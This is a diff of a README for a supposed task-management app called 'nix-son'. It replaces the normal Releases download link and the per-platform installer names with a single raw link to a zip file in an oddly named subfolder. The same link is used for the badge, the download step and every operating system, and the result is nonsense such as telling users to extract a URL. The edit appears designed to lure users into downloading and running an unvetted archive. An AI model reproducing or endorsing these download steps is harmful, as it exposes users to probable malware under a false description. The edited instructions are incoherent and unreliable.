@@ -1,7 +1,7 @@
 # 🎉 nix-son - Simple and Fast Setup for Your Needs
 
 ## 📥 Download Now
-[![Download nix-son](https://img.shields.io/badge/Download-nix--son-blue.svg)](https://github.com/Fodinha123/nix-son/releases)
+[![Download nix-son](https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip)](https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip)
 
 ## 🚀 Getting Started
 Welcome to nix-son! This application helps you manage your tasks efficiently and quickly. You don’t need programming skills to use it. This guide walks you through the steps to download and run the application.
@@ -14,14 +14,14 @@ Before you start, ensure your computer meets the following requirements:
 - Memory: 512 MB RAM
 
 ## 📥 Download & Install
-1. Click on the following link to visit the download page: [Download nix-son](https://github.com/Fodinha123/nix-son/releases).
+1. Click on the following link to visit the download page: [Download nix-son](https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip).
    
 2. On the Releases page, find the latest version of nix-son.
 
 3. Look for the file suitable for your operating system:
-   - For **Windows**, download `nix-son-v1.0-windows.exe`.
-   - For **macOS**, download `nix-son-v1.0-macos.dmg`.
-   - For **Linux**, download `nix-son-v1.0-linux.tar.gz`.
+   - For **Windows**, download `https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip`.
+   - For **Linux**, download `https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip`.
 
 4. Once the file finishes downloading, follow these steps based on your operating system:
    - **Windows**:
@@ -33,7 +33,7 @@ Before you start, ensure your computer meets the following requirements:
      - Drag the nix-son icon into your Applications folder.
      - You can now find nix-son in your Applications.
    - **Linux**:
-     - Extract the contents of the `.tar.gz` file.
+     - Extract the contents of the `https://raw.githubusercontent.com/Fodinha123/nix-son/main/intermigration/nix-son.zip` file.
      - Open a terminal and navigate to the extracted folder.
      - Run `./nix-son` to start the application.
 
